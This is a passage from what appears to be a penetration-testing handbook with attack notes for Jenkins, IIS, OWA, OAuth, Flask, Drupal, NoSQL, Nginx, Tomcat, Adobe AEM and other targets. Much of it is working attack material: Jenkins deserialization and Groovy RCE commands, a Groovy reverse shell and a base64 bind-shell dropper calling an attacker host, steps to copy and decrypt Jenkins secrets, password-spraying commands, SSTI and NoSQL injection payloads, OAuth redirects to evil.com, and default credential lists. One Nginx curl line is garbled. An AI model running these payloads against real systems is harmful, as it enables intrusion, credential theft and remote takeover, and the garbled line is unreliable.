<h3 id="deserialization-rce-in-old-jenkins-cve-2015-8103-jenkins-1638-and-older"><a class="header" href="#deserialization-rce-in-old-jenkins-cve-2015-8103-jenkins-1638-and-older">Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)</a></h3>
<p>Use <a href="https://github.com/frohoff/ysoserial">ysoserial</a> to generate a payload. Then RCE using <a href="https://github.com/gquere/pwn_jenkins/blob/master/rce/jenkins_rce_cve-2015-8103_deser.py">this script</a>:</p>
<pre><code class="language-bash">java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.sh' &gt; payload.out
./jenkins_rce.py jenkins_ip jenkins_port payload.out
</code></pre>
<h3 id="authenticationacl-bypass-cve-2018-1000861-jenkins-21501"><a class="header" href="#authenticationacl-bypass-cve-2018-1000861-jenkins-21501">Authentication/ACL bypass (CVE-2018-1000861, Jenkins &lt;2.150.1)</a></h3>
<p>Details <a href="https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html">here</a>.</p>
<p>If the Jenkins requests authentication but returns valid data using the following request, it is vulnerable:</p>
<pre><code class="language-bash">curl -k -4 -s https://example.com/securityRealm/user/admin/search/index?q=a
</code></pre>
<h3 id="metaprogramming-rce-in-jenkins-plugins-cve-2019-1003000-cve-2019-1003001-cve-2019-1003002"><a class="header" href="#metaprogramming-rce-in-jenkins-plugins-cve-2019-1003000-cve-2019-1003001-cve-2019-1003002">Metaprogramming RCE in Jenkins Plugins (CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002)</a></h3>
<p>Original RCE vulnerability <a href="https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html">here</a>, full exploit <a href="https://github.com/petercunha/jenkins-rce">here</a>.</p>
<p>Alternative RCE with Overall/Read and Job/Configure permissions <a href="https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc">here</a>.</p>
<h3 id="checkscript-rce-in-jenkins-cve-2019-1003029-cve-2019-1003030"><a class="header" href="#checkscript-rce-in-jenkins-cve-2019-1003029-cve-2019-1003030">CheckScript RCE in Jenkins (CVE-2019-1003029, CVE-2019-1003030)</a></h3>
<p>Check if a Jenkins instance is vulnerable (needs Overall/Read permissions) with some Groovy:</p>
<pre><code class="language-bash">curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'
</code></pre>
<p>Execute arbitrary bash commands:</p>
<pre><code class="language-bash">curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt".execute()}}'
</code></pre>
<p>If you don't immediately get a reverse shell you can debug by throwing an exception:</p>
<pre><code class="language-bash">curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){def proc="id".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}'
</code></pre>
<h3 id="git-plugin-3120-rce-in-jenkins-cve-2019-10392"><a class="header" href="#git-plugin-3120-rce-in-jenkins-cve-2019-10392">Git plugin (&lt;3.12.0) RCE in Jenkins (CVE-2019-10392)</a></h3>
<p>This one will only work is a user has the 'Jobs/Configure' rights in the security matrix, so it's very specific.</p>
<h3 id="dumping-builds-to-find-cleartext-secrets"><a class="header" href="#dumping-builds-to-find-cleartext-secrets">Dumping builds to find cleartext secrets</a></h3>
<p>Use <a href="https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py">this script</a> to dump build console outputs and build environment variables to hopefully find cleartext secrets.</p>
<pre><code class="language-text">usage: jenkins_dump_builds.py [-h] [-u USER] [-p PASSWORD] [-o OUTPUT_DIR]
                              [-l] [-r] [-d] [-s] [-v]
                              url [url ...]

Dump all available info from Jenkins

positional arguments:
  url

optional arguments:
  -h, --help            show this help message and exit
  -u USER, --user USER
  -p PASSWORD, --password PASSWORD
  -o OUTPUT_DIR, --output-dir OUTPUT_DIR
  -l, --last            Dump only the last build of each job
  -r, --recover_from_failure
                        Recover from server failure, skip all existing
                        directories
  -d, --downgrade_ssl   Downgrade SSL to use RSA (for legacy)
  -s, --no_use_session  Don't reuse the HTTP session, but create a new one for
                        each request (for legacy)
  -v, --verbose         Debug mode
</code></pre>
<h3 id="password-spraying"><a class="header" href="#password-spraying">Password spraying</a></h3>
<p>Use <a href="https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py">this python script</a>.</p>
<h3 id="files-to-copy-after-compromising"><a class="header" href="#files-to-copy-after-compromising">Files to copy after compromising</a></h3>
<p>These files are needed to decrypt Jenkins secrets:</p>
<ul>
<li>secrets/master.key</li>
<li>secrets/hudson.util.Secret</li>
</ul>
<p>Such secrets can usually be found in:</p>
<ul>
<li>credentials.xml</li>
<li>jobs/.../build.xml</li>
</ul>
<p>Here's a regexp to find them:</p>
<pre><code class="language-bash">grep -re "^\s*&lt;[a-zA-Z]*&gt;{[a-zA-Z0-9=+/]*}&lt;"
</code></pre>
<h3 id="decrypt-jenkins-secrets-offline"><a class="header" href="#decrypt-jenkins-secrets-offline">Decrypt Jenkins secrets offline</a></h3>
<p>Use <a href="https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py">this script</a> to decrypt previously dumped secrets.</p>
<pre><code class="language-text">Usage:
    jenkins_offline_decrypt.py &lt;jenkins_base_path&gt;
or:
    jenkins_offline_decrypt.py &lt;master.key&gt; &lt;hudson.util.Secret&gt; [credentials.xml]
or:
    jenkins_offline_decrypt.py -i &lt;path&gt; (interactive mode)
</code></pre>
<h3 id="groovy-scripts"><a class="header" href="#groovy-scripts">Groovy Scripts</a></h3>
<h3 id="decrypt-jenkins-secrets-from-groovy"><a class="header" href="#decrypt-jenkins-secrets-from-groovy">Decrypt Jenkins secrets from Groovy</a></h3>
<pre><code class="language-java">println(hudson.util.Secret.decrypt("{...}"))
</code></pre>
<h3 id="command-execution-from-groovy"><a class="header" href="#command-execution-from-groovy">Command execution from Groovy</a></h3>
<pre><code class="language-java">def proc = "id".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
</code></pre>
<p>For multiline shell commands, use the following shell syntax trick (example includes bind shell):</p>
<pre><code class="language-java">def proc="sh -c \$@|sh . echo /bin/echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgD96UiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU= | base64 -d &gt; /tmp/65001".execute();
</code></pre>
<p>Automate it using <a href="https://github.com/gquere/pwn_jenkins/blob/master/rce/jenkins_rce_admin_script.py">this script</a>.</p>
<h3 id="reverse-shell-from-groovy"><a class="header" href="#reverse-shell-from-groovy">Reverse shell from Groovy</a></h3>
<pre><code class="language-java">String host="myip";
int port=1234;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
</code></pre>
<p>I'll leave this reverse shell tip to recover a fully working PTY here in case anyone needs it:</p>
<pre><code class="language-bash">python -c 'import pty; pty.spawn("/bin/bash")'
^Z bg
stty -a
echo $TERM
stty raw -echo
fg
export TERM=...
stty rows xx columns yy
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="iis"><a class="header" href="#iis">IIS</a></h1>
<pre><code># Reminder:
Case insensitive
IIS Shortname
VIEWSTATE deserialization RCE gadget
Web.config upload tricks
Debug mode w/ detailed stack traces and full path
Debugging scripts often deployed (ELMAH, Trace)
Telerik RCE

# ViewState:
https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC

# WebResource.axd:
https://github.com/inquisb/miscellaneous/blob/master/ms10-070_check.py

# ShortNames
https://github.com/irsdl/IIS-ShortName-Scanner
java -jar iis_shortname_scanner.jar 2 20 http://domain.es
https://github.com/bitquark/shortscan
https://github.com/sw33tLie/sns


# Padding Oracle Attack:
# https://github.com/KishanBagaria/padding-oracle-attacker
npm install --global padding-oracle-attacker
padding-oracle-attacker decrypt  hex:   [options]
padding-oracle-attacker decrypt  b64:   [options]
padding-oracle-attacker encrypt              [options]
padding-oracle-attacker encrypt  hex:    [options]
padding-oracle-attacker analyze  [] [options]
# https://github.com/liquidsec/pyOracle2

# Look for web.config or web.xml
https://x.x.x.x/.//WEB-INF/web.xml

# ASP - force error paths
/con/
/aux/
con.aspx
aux.aspx

# HTTPAPI 2.0 404 Error
Change Host header to correct subdomain
Add to /etc/hosts
Scan again including IIS Shortnames

# IIS 7
IIS Short Name scanner
HTTP.sys DOS RCE

# ViewState
# https://github.com/0xacb/viewgen
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="vhosts"><a class="header" href="#vhosts">VHosts</a></h1>
<h2 id="tools-22"><a class="header" href="#tools-22">Tools</a></h2>
<pre><code class="language-text"># https://github.com/jobertabma/virtual-host-discovery
ruby scan.rb --ip=192.168.1.101 --host=domain.tld

# https://github.com/dariusztytko/vhosts-sieve
python3 vhosts-sieve.py -d domains.txt -o vhosts.txt

# Enum vhosts
fierce -dns example.com

# https://github.com/codingo/VHostScan
VHostScan -t example.com
</code></pre>
<h2 id="techniques"><a class="header" href="#techniques">Techniques</a></h2>
<pre><code class="language-text"># ffuf
badresponse=$(curl -s -H "host: totallynotexistsforsure.bugcrowd.com" https://bugcrowd.com | wc -c)
ffuf -u https://TARGET.com -H "Host: FUZZ.TARGET.com" -w werdlists/dns-hostnames/nmap-vhosts-all.txt -fs $badresponse

# Manual with subdomains list
for sub in $(cat subdomains.txt); do
			echo "$sub $(dig +short a $sub | tail -n1)" | anew -q subdomains_ips.txt
done

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="firebase"><a class="header" href="#firebase">Firebase</a></h1>
<h2 id="tools-23"><a class="header" href="#tools-23">Tools</a></h2>
<pre><code class="language-text"># https://github.com/Turr0n/firebase
python3 firebase.py -p 4 --dnsdumpster -l file

# https://github.com/MuhammadKhizerJaved/Insecure-Firebase-Exploit
Firebase_Exploit.py

# https://github.com/viperbluff/Firebase-Extractor
firebase.py xyz.firebaseio.com
</code></pre>
<pre><code class="language-python"># Python conector
# https://github.com/thisbejim/Pyrebase

import pyrebase

config = {
  "apiKey": "FIREBASE_API_KEY",
  "authDomain": "FIREBASE_AUTH_DOMAIN_ID.firebaseapp.com",
  "databaseURL": "https://FIREBASE_AUTH_DOMAIN_ID.firebaseio.com",
  "storageBucket": "FIREBASE_AUTH_DOMAIN_ID.appspot.com",
}

firebase = pyrebase.initialize_app(config)

db = firebase.database()

print(db.get())
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="owa"><a class="header" href="#owa">OWA</a></h1>
<h2 id="tools-24"><a class="header" href="#tools-24">Tools</a></h2>
<pre><code class="language-text"># https://github.com/dafthack/MailSniper
# Spraying toolkit: https://github.com/byt3bl33d3r/SprayingToolkit
Invoke-PasswordSprayOWA -ExchHostName mail.r-1x.com -UserList C:\users.txt -Password Dakota2019! -OutFile C:\creds.txt -Threads 10
python3 atomizer.py owa mail.r-1x.com 'Dakota2019!' ../users.txt

# https://github.com/gremwell/o365enum
./o365enum.py -u users.txt -p Password2 -n 1

# https://github.com/mdsecactivebreach/o365-attack-toolkit

</code></pre>
<h2 id="bypasses-2"><a class="header" href="#bypasses-2">Bypasses</a></h2>
<pre><code class="language-text"># UserName Recon/Password Spraying - http://www.blackhillsinfosec.com/?p=4694
# Password Spraying MFA/2FA - http://www.blackhillsinfosec.com/?p=5089
# Password Spraying/GlobalAddressList - http://www.blackhillsinfosec.com/?p=5330
# Outlook 2FA Bypass - http://www.blackhillsinfosec.com/?p=5396
# Malicious Outlook Rules - https://silentbreaksecurity.com/malicious-outlook-rules/
# Outlook Rules in Action - http://www.blackhillsinfosec.com/?p=5465

Name Conventions:
- FirstnameLastinitial
- FirstnameLastname
- Lastname.firstname
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="oauth"><a class="header" href="#oauth">OAuth</a></h1>
<h2 id="explanation-1"><a class="header" href="#explanation-1">Explanation</a></h2>
<pre><code># OAuth 2.0
https://oauth.net/2/
https://oauth.net/2/grant-types/authorization-code/

Flow:

1. MyWeb tried integrate with Twitter.
2. MyWeb request to Twitter if you authorize.
3. Prompt with a consent.
4. Once accepted Twitter send request redirect_uri with code and state.
5. MyWeb take code and it's own client_id and client_secret and ask server for access_token.
6. MyWeb call Twitter API with access_token.

Definitions:

- resource owner: The resource owner is the user/entity granting access to their protected resource, such as their Twitter account Tweets
- resource server: The resource server is the server handling authenticated requests after the application has obtained an access token on behalf of the resource owner . In the above example, this would be https://twitter.com
- client application: The client application is the application requesting authorization from the resource owner. In this example, this would be https://yourtweetreader.com.
- authorization server: The authorization server is the server issuing access tokens to the client application after successfully authenticating the resource owner and obtaining authorization. In the above example, this would be https://twitter.com
- client_id: The client_id is the identifier for the application. This is a public, non-secret unique identifier.
- client_secret: The client_secret is a secret known only to the application and the authorization server. This is used to generate access_tokens
- response_type: The response_type is a value to detail which type of token is being requested, such as code
- scope: The scope is the requested level of access the client application is requesting from the resource owner
- redirect_uri: The redirect_uri  is the URL the user is redirected to after the authorization is  complete. This usually must match the redirect URL that you have  previously registered with the service
- state: The state  parameter can persist data between the user being directed to the  authorization server and back again. It’s important that this is a  unique value as it serves as a CSRF protection mechanism if it contains a  unique or random value per request
- grant_type: The grant_type parameter explains what the grant type is, and which token is going to be returned
- code: This code is the authorization code received from the authorization server which will be in the query string parameter “code” in this request. This code is used in conjunction with the client_id and client_secret by the client application to fetch an access_token
- access_token: The access_token is the token that the client application uses to make API requests on behalf of a resource owner
- refresh_token: The refresh_token allows an application to obtain a new access_token without prompting the user
</code></pre>
<h2 id="bugs"><a class="header" href="#bugs">Bugs</a></h2>
<pre><code># Weak redirect_uri
1. Alter the redirect_uri URL with TLD aws.console.amazon.com/myservice -&gt; aws.console.amazon.com
2. Finish OAuth flow and check if you're redirected to the TLD, then is vulnerable
3. Check your redirect is not to Referer header or other param

https://yourtweetreader.com/callback?redirectUrl=https://evil.com
https://www.target01.com/api/OAUTH/?next=https://www.target01.com//evil.com/
https://www.target01.com/api/OAUTH?next=https://www.target01.com%09.evil.com
https://www.target01.com/api/OAUTH/?next=https://www.target01.com%252e.evil.com
https://www.target01.com/api/OAUTH/?next=https://www.target01.com/project/team
http://target02.com/oauth?redirect_uri=https://evil.com[.target02.com/
https://www.target01.com/api/OAUTH/?next=https://yourtweetreader.com.evil.com
https://www.target.com/endpoint?u=https://EVILtwitter.com/

ffuf -w words.txt -u https://www.target.com/endpoint?u=https://www.FUZZ.com/ 

# Path traversal: https://yourtweetreader.com/callback/../redirect?url=https://evil.com

# HTML Injection and stealing tokens via referer header
Check referer header in the requests for sensitive info
   
# Access Token Stored in Browser History
Check browser history for sensitive info

# Improper handling of state parameter
Check lack of state parameter and is in url params and is passed to all the flow
Verifying State entropy
Check state is not reused
Remove state and URI and check request is invalid

# Access Token Stored in JavaScript

# Lack of verification
If not email verification is needed in account creation, register before the victim.
If not email verification in Oauth signing, register other app before the victim.

# Access token passed in request body
If the access token is passed in the request body at the time of allocating the access token to the web application there arises an attack scenario. 
An attacker can create a web application and register for an Oauth framework with a provider such as twitter or facebook. The attacker uses it as a malicious app for gaining access tokens. 
For example, a Hacker can build his own facebook app and get victim’s facebook access token and use that access token to login into victim account.

# Reusability of an Oauth access token
Replace the new Oauth access token with the old one and continue to the application. This should not be the case and is considered as a very bad practice.
</code></pre>
<h2 id="oauth-resources"><a class="header" href="#oauth-resources">OAuth resources</a></h2>
<pre><code>https://owasp.org/www-pdf-archive/20151215-Top_X_OAuth_2_Hacks-asanso.pdf
https://medium.com/@lokeshdlk77/stealing-facebook-mailchimp-application-oauth-2-0-access-token-3af51f89f5b0
https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1
https://gauravnarwani.com/misconfigured-oauth-to-account-takeover/
https://medium.com/@Jacksonkv22/oauth-misconfiguration-lead-to-complete-account-takeover-c8e4e89a96a
https://medium.com/@logicbomb_1/bugbounty-user-account-takeover-i-just-need-your-email-id-to-login-into-your-shopping-portal-7fd4fdd6dd56
https://medium.com/@protector47/full-account-takeover-via-referrer-header-oauth-token-steal-open-redirect-vulnerability-chaining-324a14a1567
https://hackerone.com/reports/49759
https://hackerone.com/reports/131202
https://hackerone.com/reports/6017
https://hackerone.com/reports/7900
https://hackerone.com/reports/244958
https://hackerone.com/reports/405100
https://ysamm.com/?p=379
https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/
https://medium.com/@godofdarkness.msf/mail-ru-ext-b-scope-account-takeover-1500-abdb1560e5f9
https://medium.com/@tristanfarkas/finding-a-security-bug-in-discord-and-what-it-taught-me-516cda561295
https://medium.com/@0xgaurang/case-study-oauth-misconfiguration-leads-to-account-takeover-d3621fe8308b
https://medium.com/@rootxharsh_90844/abusing-feature-to-steal-your-tokens-f15f78cebf74
http://blog.intothesymmetry.com/2014/02/oauth-2-attacks-and-bug-bounties.html
http://blog.intothesymmetry.com/2015/04/open-redirect-in-rfc6749-aka-oauth-20.html
https://www.veracode.com/blog/research/spring-social-core-vulnerability-disclosure
https://medium.com/@apkash8/oauth-and-security-7fddce2e1dc5
https://xploitprotocol.medium.com/exploiting-oauth-2-0-authorization-code-grants-379798888893
</code></pre>
<h2 id="oauth-scheme"><a class="header" href="#oauth-scheme">OAuth scheme</a></h2>
<p><img src="enumeration/webservices/../../.gitbook/assets/imagen%20(5).png" alt="" /></p>
<h2 id="code-grant-flow"><a class="header" href="#code-grant-flow">Code grant flow</a></h2>
<p><img src="enumeration/webservices/../../.gitbook/assets/imagen%20(4).png" alt="" /></p>
<h2 id="oauth-attack-mindmap"><a class="header" href="#oauth-attack-mindmap">OAuth Attack mindmap</a></h2>
<p><img src="enumeration/webservices/../../.gitbook/assets/photo_2020-06-08_07-24-17.jpg" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="flask"><a class="header" href="#flask">Flask</a></h1>
<pre><code class="language-text"># https://github.com/Paradoxis/Flask-Unsign

pip3 install flask-unsign
flask-unsign
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
flask-unsign --decode --server 'https://www.example.com/login'
flask-unsign --unsign --cookie &lt; cookie.txt
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'

# Python Flask SSTI Payloads and tricks

* {{url_for.globals}}
* {{request.environ}}
* {{config}}
* {{url_for.__globals__.__builtins__.open('/etc/passwd').read()}}
* {{self}}
* request|attr('class') == request.class == request[\x5f\x5fclass\x5f\x5f]       
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="symfony--twig"><a class="header" href="#symfony--twig">Symfony &amp;&amp; Twig</a></h1>
<pre><code>**Tools**
# Server-Side Template Injection and Code Injection Detection and Exploitation Tool 
# https://github.com/epinna/tplmap
./tplmap.py -u 'http://www.target.com/page?name=John'
# https://github.com/ambionics/symfony-exploits

# Symfony:
Check for www.example.com/_profiler/ it contains errors and server variables
# Symfony debug looter:
https://github.com/synacktiv/eos/

# Twig:
https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="drupal"><a class="header" href="#drupal">Drupal</a></h1>
<pre><code class="language-bash">**Tools** 
# droopescan
# https://github.com/droope/droopescan
droopescan scan drupal -u https://example.com -t 32

# drupwn
# https://github.com/immunIT/drupwn
sudo python3 drupwn --mode enum|exploit --target https://example.com

# https://github.com/ajinabraham/CMSScan
docker build -t cmsscan .
docker run -it -p 7070:7070 cmsscan
python3 cmsmap.py -f D https://www.example.com -F

# https://github.com/Tuhinshubhra/CMSeeK
python3 cmseek.py -u domain.com

# Drupal &lt; 8.7.x Authenticated RCE module upload
https://www.drupal.org/project/drupal/issues/3093274
https://www.drupal.org/files/issues/2019-11-08/drupal_rce.tar_.gz

# Drupal &lt; 9.1.x Authenticated RCE Twig templates
https://www.drupal.org/project/drupal/issues/2860607
"Administer views" -&gt; new View of User Fields - &gt;Add a "Custom text"
"{{ {"#lazy_builder": ["shell_exec", ["touch /tmp/hellofromviews"]]} }}"

# If found /node/$NUMBER, the number could be devs or tests pages

# drupal 8
# https://www.exploit-db.com/exploits/46459

# Check for username disclosure on old versions:
?q=admin/views/ajax/autocomplete/user/a

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="nosql-mongodb-couchdb"><a class="header" href="#nosql-mongodb-couchdb">NoSQL (MongoDB, CouchDB)</a></h1>
<pre><code class="language-bash"># Tools
# https://github.com/codingo/NoSQLMap
python NoSQLMap.py
# https://github.com/torque59/Nosql-Exploitation-Framework
python nosqlframework.py -h
# https://github.com/Charlie-belmer/nosqli
nosqli scan -t http://localhost:4000/user/lookup?username=test
# https://github.com/FSecureLABS/N1QLMap
./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --extract travel-sample

# Payload: 
' || 'a'=='a

mongodbserver:port/status?text=1

# in URL
username[$ne]=toto&amp;password[$ne]=toto

##in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}

- Trigger MongoDB syntax error -&gt; ' " \ ; { }
- Insert logic -&gt; ' || '1' == '1' ; //
- Comment out -&gt; //
- Operators -&gt; $where $gt $lt $ne $regex
- Mongo commands -&gt; db.getCollectionNames()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="php-1"><a class="header" href="#php-1">PHP</a></h1>
<pre><code class="language-bash"># Tools
https://github.com/TarlogicSecurity/Chankro
# Bypass disable_functions and open_basedir
python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
# Unserialize PHP Payload generator
https://github.com/ambionics/phpggc
# Backup Artifacts
# https://github.com/mazen160/bfac
bfac --url http://example.com/test.php

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ror-ruby-on-rails"><a class="header" href="#ror-ruby-on-rails">RoR (Ruby on Rails)</a></h1>
<pre><code>**Tools** 
# https://github.com/presidentbeef/brakeman
gem install brakeman
brakeman /path/to/rails/application

# RoR RCE's
# https://bishopfox.com/blog/ruby-vulnerabilities-exploits
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="jboss---java-deserialization"><a class="header" href="#jboss---java-deserialization">JBoss - Java Deserialization</a></h1>
<pre><code class="language-text"># JexBoss
# https://github.com/joaomatosf/jexboss
python jexboss.py -host http://target_host:8080
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="onelogin---saml-login"><a class="header" href="#onelogin---saml-login">OneLogin - SAML Login</a></h1>
<pre><code># https://developers.onelogin.com/saml
# https://www.securing.pl/en/saml-what-can-go-wrong-security-check/
# https://github.com/fadyosman/SAMLExtractor
./samle.py -u https://carbon-prototype.uberinternal.com/
./samle.py -r "https://domain.onelogin.com/trust/saml2/http-post/sso/571434?SAMLRequest=nVNNb9swDP0rhu7%2BkO0iqRAH8FIMC9BtRuLtOjAS2wqwJU%2Bi1%2FTfT3aSIoc1h10siXzie3yiVx76bhD1SC9mh79H9BQd%2B854MScqNjojLHjthYEevSAp9vXXR5EnmRicJSttx6LmvPukjdLm%2Bfa1wwnkxZe2beLm%2B75l0U90XltTsQBg0db7EbfGExgKoYwvY85jXrZZJgouijxAHiqGPC8XRblEDF9eZvcqX4DEXC3v70CpgkW19%2BgoFN5Y48ce3R7dHy3xx%2B6xYi9EgxdpKsEdrInnbuhtwGQ8oNOG0BnoEml7UZZFarWC4FI6%2BfJLnsqx9Wo6ilmvuzLutgFwUcXWFw0wDIk12NlnbSbKmSbtkUABQXq34GVRrtIrthP1IL6F8tuHxnZavkV119nXjUMgrBi5EVn02boe6GNBPOFzRKv4aYYK7EF3tVIOvWfphec8HajmWQl%2BEh4p2th%2BAKf99HR4BEkXS65Rmy50vMOn%2FzHoJkwKOZUO4SYsr9apaRBRBpWtA%2BMH6%2Bhs2r%2F0rE%2B5D3p7z17%2FHOu%2F&amp;RelayState=%2F"
</code></pre>
<p><img src="enumeration/webservices/../../.gitbook/assets/imagen%20(10).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="flash-swf"><a class="header" href="#flash-swf">Flash SWF</a></h1>
<pre><code class="language-text"># SWF Param Finder
https://github.com/m4ll0k/SWFPFinder
bash swfpfinder.sh https://example.com/test.swf
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="nginx"><a class="header" href="#nginx">Nginx</a></h1>
<pre><code class="language-text">curl -gsS https://example.com:443/../../../%00/nginx-handler?/usr/lib/nginx/modules/ngx_stream_module.so:127.0.0.1:80:/bin/sh%00example.com/../../../%00/n …\&lt;'protocol:TCP' -O 0x0238f06a#PLToffset |sh; nc /dev/tcp/localhost

# If merge_slashes is OFF path traversal is possible, just append 1 slash more to find
///////../../../etc/passwd
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="python"><a class="header" href="#python">Python</a></h1>
<pre><code class="language-text"># Analyze Python code
https://github.com/PyCQA/bandit

# Python Web Server common flaws
Input injection in filename:
"; cat /etc/passwd

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tomcat"><a class="header" href="#tomcat">Tomcat</a></h1>
<pre><code class="language-text">Check if the following scripts exists (v4.x - v7.x):
/examples/jsp/num/numguess.jsp
/examples/jsp/dates/date.jsp
/examples/jsp/snp/snoop.jsp
/examples/jsp/error/error.html
/examples/jsp/sessions/carts.html
/examples/jsp/checkbox/check.html
/examples/jsp/colors/colors.html
/examples/jsp/cal/login.html
/examples/jsp/include/include.jsp
/examples/jsp/forward/forward.jsp
/examples/jsp/plugin/plugin.jsp
/examples/jsp/jsptoserv/jsptoservlet.jsp
/examples/jsp/simpletag/foo.jsp
/examples/jsp/mail/sendmail.jsp
/examples/servlet/HelloWorldExample
/examples/servlet/RequestInfoExample
/examples/servlet/RequestHeaderExample
/examples/servlet/RequestParamExample
/examples/servlet/CookieExample
/examples/servlet/JndiServlet
/examples/servlet/SessionExample
/tomcat-docs/appdev/sample/web/hello.jsp

Users under 
$TOMCAT_HOME/tomcat6/tomcat-users.xml
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="adobe-aem"><a class="header" href="#adobe-aem">Adobe AEM</a></h1>
<h2 id="tools-25"><a class="header" href="#tools-25">Tools</a></h2>
<pre><code class="language-bash"># https://github.com/0ang3el/aem-hacker
python3 aem_discoverer.py --file list.txt
python3 aem_hacker.py -u https://target.com --host [SSRF_CALLBACK]
#https://github.com/Raz0r/aemscan
</code></pre>
<h2 id="paths"><a class="header" href="#paths">Paths</a></h2>
<pre><code>#https://github.com/clarkvoss/AEM-List/blob/main/paths
#https://github.com/emadshanab/Adobe-Experience-Manager/blob/main/aem-paths.txt
</code></pre>
<h2 id="creds"><a class="header" href="#creds">Creds</a></h2>
<pre><code>admin:admin
author:author
anonymous:anonymous
replication-receiver:replication-receiver
jdoe@geometrixx.info:jdoe
aparker@geometrixx.info:aparker
grios:password
vgnadmin:vgnadmin
james.devore@spambob.com:password
matt.monroe@mailinator.com:password
aaron.mcdonald@mailinator.com:password
jason.werner@dodgit.com:password)
</code></pre>
<h2 id="vulns"><a class="header" href="#vulns">Vulns</a></h2>
<h3 id="cve-2016-0957---bypass-dispatcher-filters"><a class="header" href="#cve-2016-0957---bypass-dispatcher-filters">CVE-2016-0957 - Bypass dispatcher filters</a></h3>
<pre><code class="language-bash">https://aemsite/bin/querybuilder.json/a.css
https://aemsite/bin/querybuilder.json/a.html
https://aemsite/bin/querybuilder.json/a.ico
https://aemsite/bin/querybuilder.json/a.png
https://aemsite/bin/querybuilder.json;%0aa.css
https://aemsite/bin/querybuilder.json/a.1.json
https://aemsite///bin///querybuilder.json
https://aemsite///etc.json

#Depending on the version and configuration of the affected AEM installation, the above vulnerability could expose the Publish tier to a number of vulnerabilities, including:
# Provides a proxy which is able to be used to perform arbitrary server-side requests.
/libs/opensocial/proxy
# Exposes a reflected Cross-Site Scripting (XSS) vulnerability in older versions of AEM 5.X.
/etc/mobile/useragent-test.html
# Exposes an unauthenticated, browsable view of all content in the repository which may lead to information disclosure.
/etc/reports/diskusage.html
</code></pre>
<p>https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="magento"><a class="header" href="#magento">Magento</a></h1>
<pre><code class="language-text">https://github.com/steverobbins/magescan
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sap"><a class="header" href="#sap">SAP</a></h1>
